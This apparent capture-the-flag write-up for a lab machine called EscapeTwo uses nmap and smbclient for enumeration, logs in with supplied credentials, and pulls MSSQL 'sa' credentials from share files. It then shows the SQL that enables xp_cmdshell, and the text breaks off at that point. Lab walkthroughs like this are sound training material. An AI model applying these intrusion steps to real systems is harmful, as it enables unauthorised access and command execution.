# EscapeTwo



### Enumeration Phase

Start with nmap scan

```
nmap 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Here we have everything standards in windows machine.



### SMB User Crack

Now lets checking out the creds that given to us: `rose / KxEPkKe6R8su`

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Checking for File in SMB

```
smbclient -L //10.10.11.51 -U 'rose'
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```
smbclient //10.10.11.51/Accounting\ Department -U rose
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Looking through to the files, download it using the get command and unpack the files.

Inside this file have user creds and we can use later for futher enumeration.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### Enabling xp\_cmdshell <a href="#finding-vulnerability--enabling-xp_cmdshell" id="finding-vulnerability--enabling-xp_cmdshell"></a>

Using `sa` creds. im able to login tp the MSSQL via admin.

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

To exploit MSSQL and enable xp\_cmdshell im using this command:

```
-- xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
 
-- check
EXEC sp_configure 'xp_cmdshell';
```

\
